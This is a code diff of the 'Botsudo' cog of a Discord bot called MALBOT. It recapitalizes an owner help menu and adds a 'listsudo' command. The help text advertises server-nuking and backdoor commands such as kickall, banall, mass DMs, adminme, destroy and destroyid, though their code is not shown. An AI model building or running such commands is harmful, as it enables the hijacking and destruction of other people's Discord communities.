@@ -69,10 +69,10 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def malhelp(self, ctx):
         """Shows help menu for bot owners/sudoers"""
-        em = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
+        em = discord.Embed(title='MALBOT Help', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
 
-        em.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leaveserver [server_id]` leaves the server.', inline=False)
-        em.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`renameall <name>` Renames everyone in a server.\n`msgall <msg>` DMs everyone in a server.\n`deleteall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
+        em.add_field(name='Owner Commands:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leaveserver [server_id]` leaves the server.', inline=False)
+        em.add_field(name='MALBOT Commands:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`renameall <name>` Renames everyone in a server.\n`msgall <msg>` DMs everyone in a server.\n`deleteall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
         em.set_footer(text=f'Your usage is being logged {ctx.message.author} ({ctx.message.author.id}).', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
 
         await ctx.send(embed=em)
@@ -174,6 +174,23 @@ class Botsudo(commands.Cog):
             except Exception as e:
                 await ctx.send('Failed to remove user to sudo database!')
                 errorlogs_webhook.send(f'>>> Failed to remove {user} ({user.id}) from SUDO DATABSE!\nEXCEPTION: {e}')
+    
+    @commands.check(BOT_OWNER_CHECK)
+    @commands.command()
+    async def listsudo(self, ctx):
+        """List all users that has sudo perms"""
+
+        if (sudo_users_c.estimated_document_count() == 0):
+            await ctx.send('**❌ There are no sudo users!**')
+        else:
+            results = list(sudo_users_c.find())
+            em = discord.Embed(colour=RandomColour())
+            em.set_author(name=f'There are {sudo_users_c.estimated_document_count()} sudo users.', icon_url='https://img.icons8.com/material/4ac144/256/info.png')
+            
+            for x in results:
+                em.add_field(name=x['user'], value=f"ID: {x['_id']}\nPromote reason: {x['reason']}")
+
+            await ctx.send(embed=em)
 
     @commands.check(BOT_OWNER_CHECK)
     @commands.command()
